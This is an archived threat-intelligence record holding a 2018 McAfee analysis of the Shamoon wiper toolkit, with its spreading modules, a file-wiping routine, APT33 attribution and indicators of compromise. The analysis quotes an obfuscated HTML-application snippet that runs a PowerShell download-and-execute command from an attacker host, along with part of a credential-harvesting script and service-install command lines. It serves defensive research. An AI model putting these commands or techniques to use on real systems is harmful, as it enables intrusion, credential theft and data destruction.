{
    "id": "4927d8b4-9ed5-43cf-842d-06ba47bc5379",
    "created_at": "2023-01-12T15:02:49.822886Z",
    "updated_at": "2025-03-27T02:15:17.385239Z",
    "deleted_at": null,
    "sha1_hash": "6e8dbbf499376fe88947bc06283f771e0592e75a",
    "title": "2018-12-19 - Shamoon Attackers Employ New Tool Kit to Wipe Infected Systems",
    "authors": "",
    "file_creation_date": "2022-05-28T18:24:48Z",
    "file_modification_date": "2022-05-28T18:24:48Z",
    "file_size": 1887624,
    "plain_text": "# Shamoon Attackers Employ New Tool Kit to Wipe Infected Systems\n\n**securingtomorrow.mcafee.com/other-blogs/mcafee-labs/shamoon-attackers-employ-new-tool-kit-to-wipe-infected-**\nsystems/\n\nDecember 19, 2018\n\nLast week the McAfee Advanced Threat Research team posted an analysis of a new wave of\nShamoon “wiper” malware attacks that struck several companies in the Middle East and\nEurope. In that [analysis we discussed one difference to previous Shamoon campaigns. The](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/shamoon-returns-to-wipe-systems-in-middle-east-europe/)\nlatest version has a modular approach that allows the wiper to be used as a standalone\nthreat.\n\nAfter further analysis of the three versions of Shamoon and based on the evidence we\ndescribe here, we conclude that the Iranian hacker group APT33—or a group masquerading\nas APT33—is likely responsible for these attacks.\n\nIn the Shamoon attacks of 2016–2017, the adversaries used both the Shamoon Version 2\nwiper and the wiper Stonedrill. In the 2018 attacks, we find the Shamoon Version 3 wiper as\n[well as the wiper Filerase, first mentioned by Symantec.](https://www.symantec.com/blogs/threat-intelligence/shamoon-destructive-threat-re-emerges-new-sting-its-tail)\n\n\n-----\n\nThese new wiper samples (Filerase) differ from the Shamoon Version 3, which we analyzed\nlast week. The latest Shamoon appears to be part of a toolkit with several modules. We\nidentified the following modules:\n\n**OCLC.exe: Used to read a list of targeted computers created by the attackers. This**\ntool is responsible to run the second tool, spreader.exe, with the list of each targeted\nmachine.\n\n**Spreader.exe: Used to spread the file eraser in each machine previously set. It also**\ngets information about the OS version.\n\n**SpreaderPsexec.exe: Similar to spreader.exe but uses psexec.exe to remotely**\nexecute the wiper.\n\n**SlHost.exe: The new wiper, which browses the targeted system and deletes every file.**\n\nThe attackers have essentially packaged an old version (V2) of Shamoon with an\nunsophisticated toolkit coded in .Net. This suggests that multiple developers have been\ninvolved in preparing the malware for this latest wave of attacks. In our last post, we\nobserved that Shamoon is a modular wiper that can be used by other groups. With these\nrecent attacks, this supposition seems to be confirmed. We have learned that the\nadversaries prepared months in advance for this attack, with the wiper execution as the goal.\n\nThis post provides additional insight about the attack and a detailed analysis of the .Net tool\nkit.\n\n## Geopolitical context\n\nThe motivation behind the attack is still unclear. Shamoon Version 1 attacked just two targets\nin the Middle East. Shamoon Version 2 attacked multiple targets in Saudi Arabia. Version 3\nwent after companies in the Middle East by using their suppliers in Europe, in a supply chain\nattack.\n\nInside the .Net wiper, we discovered the following ASCII art:\n\n\n-----\n\nThese characters resemble the Arabic text ﺗﺐﱠ. This is a phrase from the Quran[َ]ﻬَﺐٍ وَﺗ[َ]ﺑِﻲ ﻟ[َ]ﺒﱠﺖْ ﯾَﺪَا أ[َ]\n(Surah Masad, Ayat 1 [111:1]) that means “perish the hands of the Father of flame” or “the\npower of Abu Lahab will perish, and he will perish.” What does this mean in the context of a\ncyber campaign targeting energy industries in the Middle East?\n\n## Overview of the attack\n\n\n-----\n\n-----\n\n## How did the malware get onto the victim’s network?\n\nWe received intelligence that the adversaries had created websites closely resembling\nlegitimate domains which carry job offerings. For example:\n\nHxxp://possibletarget.ddns.com:880/JobOffering.\n\nMany of the URLs we discovered were related to the energy sector operating mostly in the\nMiddle East. Some of these sites contained malicious HTML application files that execute\nother payloads. Other sites lured victims to login using their corporate credentials. This\npreliminary attack seems to have started by the end of August 2018, according to our\ntelemetry, to gather these credentials.\n\nA code example from one malicious HTML application file:\n\n_YjDrMeQhBOsJZ = “WS”_\n\n_wcpRKUHoZNcZpzPzhnJw = “crip”_\n\n_RulsTzxTrzYD = “t.Sh”_\n\n_MPETWYrrRvxsCx = “ell”_\n\n_PCaETQQJwQXVJ = (YjDrMeQhBOsJZ + wcpRKUHoZNcZpzPzhnJw + RulsTzxTrzYD +_\n_MPETWYrrRvxsCx)_\n\n_OoOVRmsXUQhNqZJTPOlkymqzsA=new ActiveXObject(PCaETQQJwQXVJ)_\n\n_ULRXZmHsCORQNoLHPxW = “cm”_\n\n_zhKokjoiBdFhTLiGUQD = “d.e”_\n\n_KoORGlpnUicmMHtWdpkRwmXeQN = “xe”_\n\n_KoORGlpnUicmMHtWdp = “.”_\n\n_KoORGlicmMHtWdp = “(‘http://mynetwork.ddns.net:880/*****.ps1’)_\n\n\n-----\n\n_OoOVRmsXUQhNqZJTPOlkymqzsA.run( %windir%\\\\System32\\\\ + FKeRGlzVvDMH + /c_\n_powershell -w 1 IEX (New-Object_\n_Net.WebClient)’+KoORGlpnUicmMHtWdp+’downloadstring’+KoORGlicmMHtWdp)_\n\n_OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\\\System32\\\\’ + FKeRGlzVvDMH + ‘ /c_\n_powershell -window hidden -enc_\n\nThe preceding script opens a command shell on the victim’s machine and downloads a\nPowerShell script from an external location. From another location, it loads a second file to\nexecute.\n\nWe discovered one of the PowerShell scripts. Part of the code shows they were harvesting\nusernames, passwords, and domains:\n\n_function primer {_\n\n_if ($env:username -eq “$($env:computername)$”){$u=”NT_\n_AUTHORITY\\SYSTEM”}else{$u=$env:username}_\n\n_$o=”$env:userdomain\\$u_\n\n_$env:computername_\n\n_$env:PROCESSOR_ARCHITECTURE_\n\nWith legitimate credentials to a network it is easy to login and spread the wipers.\n\n## .Net tool kit\n\nThe new wave of Shamoon is accompanied by a .Net tool kit that spreads Shamoon Version\n3 and the wiper Filerase.\n\n\n-----\n\nThis first component (OCLC.exe) reads two text files stored in two local directories.\nDirectories “shutter” and “light” contain a list of targeted machines.\n\nOCLC.exe starts a new hidden command window process to run the second component,\nspreader.exe, which spreads the Shamoon variant and Filerase with the concatenated text\nfile as parameter.\n\n\n-----\n\nThe spreader component takes as a parameter the text file that contains the list of targeted\nmachines and the Windows version. It first checks the Windows version of the targeted\ncomputers.\n\nThe spreader places the executable files (Shamoon and Filerase) into the folder Net2.\n\nIt creates a folder on remote computers: C:\\\\Windows\\System32\\Program Files\\Internet\nExplorer\\Signing.\n\n\n-----\n\nThe spreader copies the executables into that directory.\n\nIt runs the executables on the remote machine by creating a batch file in the administrative\nshare \\\\RemoteMachine\\admin$\\\\process.bat. This file contains the path of the executables.\nThe spreader then sets up the privileges to run the batch file.\n\nIf anything fails, the malware creates the text file NotFound.txt, which contains the name of\nthe machine and the OS version. This can be used by the attackers to track any issues in the\nspreading process.\n\nThe following screenshot shows the “execute” function:\n\nIf the executable files are not present in the folder Net2, it checks the folders “all” and Net4.\n\n\n-----\n\nTo spread the wipers, the attackers included an additional spreader using Psexec.exe, an\nadministration tool used to remotely execute commands.\n\nThe only difference is that this spreader uses psexec, which is supposed to be stored in Net2\non the spreading machine. It could be used on additional machines to move the malware\nfurther.\n\n\n-----\n\nThe wiper contains three options:\n\nSilentMode: Runs the wiper without any output.\nBypassAcl: Escalates privileges. It is always enabled.\nPrintStackTrace: Tracks the number of folders and files erased.\n\nThe BypassAcl option is always “true” even if the option is not specified. It enables the\nfollowing privileges:\n\nSeBackupPrivilege\nSeRestorePrivilege\nSeTakeOwnershipPrivilege\nSeSecurityPrivilege\n\n\n-----\n\nTo find a file to erase, the malware uses function GetFullPath to get all paths.\n\nIt erases each folder and file.\n\nThe malware browses every file in every folder on the system.\n\nTo erase all files and folders, it first removes the “read only’ attributes to overwrite them.\n\nIt changes the creation, write, and access date and time to 01/01/3000 at 12:01:01 for each\nfile.\n\n\n-----\n\nThe malware rewrites each file two times with random strings.\n\nIt starts to delete the files using the API CreateFile with the ACCESS_MASK DELETE flag.\n\nThen it uses FILE_DISPOSITION_INFORMATION to delete the files.\n\n\n-----\n\nThe function ProcessTracker has been coded to track the destruction.\n\n## Conclusion\n\nIn the 2017 wave of Shamoon attacks, we saw two wipers; we see a similar feature in the\nDecember 2018 attacks. Using the “tool kit” approach, the attackers can spread the wiper\nmodule through the victims’ networks. The wiper is not obfuscated and is written in .Net\ncode, unlike the Shamoon Version 3 code, which is encrypted to mask its hidden features.\n\nAttributing this attack is difficult because we do not have all the pieces of the puzzle. We do\nsee that this attack is in line with the Shamoon Version 2 techniques. Political statements\nhave been a part of every Shamoon attack. In Version 1, the image of a burning American\nflag was used to overwrite the files. In Version 2, the picture of a drowned Syrian boy was\nused, with a hint of Yemeni Arabic, referring to the conflicts in Syria and Yemen. Now we see\na verse from the Quran, which might indicate that the adversary is related to another Middle\nEastern conflict and wants to make a statement.\n\nWhen we look at the tools, techniques, and procedures used during the multiple waves, and\n[by matching the domains and tools used (as FireEye described in its report), we conclude](https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html)\nthat APT33 or a group attempting to appear to be APT33 is behind these attacks.\n\n## Coverage\n\nThe files we detected during this incident are covered by the following signatures:\n\nTrojan-Wiper\n\n\n-----\n\nRDN/Generic.dx\nRDN/Ransom\n\n## Indicators of compromise\n\n**Hashes**\n\nOCLC.exe: f972d776d7dabf9f978dc4cc4f69d88e715541ff\nSpreader.exe: 0104e42d1d6522f6170ca4aa42fcbf70f7390a74\nSpreaderPsexec.exe: cb8faa97e94c3c60b680e28eb6a2d3910d1ce466\nSlhost.exe: 3eab7112e94f9ec1e07b9ae4696052a7cf123bba\n\n**File paths and filenames**\n\nC:\\net2\\\nC:\\all\\\nC:\\net4\\\nC:\\windows\\system32\\\nC:\\\\Windows\\System32\\Program Files\\Internet Explorer\\Signing\n\\\\admin$\\process.bat\nNothingFound.txt\nMaintenaceSrv32.exe\nMaintenaceSrv64.exe\nSlHost.exe\nOCLC.exe\nSpreader.exe\nSpreaderPsexec.exe\n\n**Some command lines**\n\ncmd.exe /c “”C:\\Program Files\\Internet Explorer\\signin\\MaintenaceSrv32.bat\ncmd.exe /c “ping -n 30 127.0.0.1 >nul && sc config MaintenaceSrv binpath=\nC:\\windows\\system32\\MaintenaceSrv64.exe LocalService” && ping -n 10 127.0.0.1\n>nul && sc start MaintenaceSrv\nMaintenaceSrv32.exe LocalService\ncmd.exe /c “”C:\\Program Files\\Internet Explorer\\signin\\MaintenaceSrv32.bat ” “\nMaintenaceSrv32.exe service\n\n[Thomas Roccia](https://www.mcafee.com/blogs/author/thomas-roccia/)\nThomas Roccia is senior security researcher on the Advanced Threat Research team. He\nworks on threat intelligence, tracking cybercrime campaigns and collaborating with law\nenforcement agencies. In a previous role,...\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-12-19 - Shamoon Attackers Employ New Tool Kit to Wipe Infected Systems.pdf"
    ],
    "report_names": [
        "2018-12-19 - Shamoon Attackers Employ New Tool Kit to Wipe Infected Systems.pdf"
    ],
    "threat_actors": [
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9fe49a5b-f3e6-4fbf-99a1-db15dad460c3",
            "created_at": "2024-05-01T02:03:08.045004Z",
            "updated_at": "2025-03-27T02:05:17.325038Z",
            "deleted_at": null,
            "main_name": "COBALT TRINITY",
            "aliases": [
                "Elfin ",
                "HOLMIUM ",
                "MAGNALIUM ",
                "Peach Sandstorm ",
                "Refined Kitten ",
                "TA451 ",
                "APT33 "
            ],
            "source_name": "Secureworks:COBALT TRINITY",
            "tools": [
                " Cadlotcorg",
                " Dello RAT",
                " Imminent Monitor",
                " KDALogger",
                " Koadic",
                " NanoCore",
                " NetWire",
                " POWERTON",
                " PoshC2",
                " Poylog",
                " PupyRAT",
                " Schoolbag",
                "AutoCore"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535769,
    "ts_updated_at": 1743041717,
    "ts_creation_date": 1653762288,
    "ts_modification_date": 1653762288,
    "files": {
        "pdf": "https://archive.orkl.eu/6e8dbbf499376fe88947bc06283f771e0592e75a.pdf",
        "text": "https://archive.orkl.eu/6e8dbbf499376fe88947bc06283f771e0592e75a.txt",
        "img": "https://archive.orkl.eu/6e8dbbf499376fe88947bc06283f771e0592e75a.jpg"
    }
}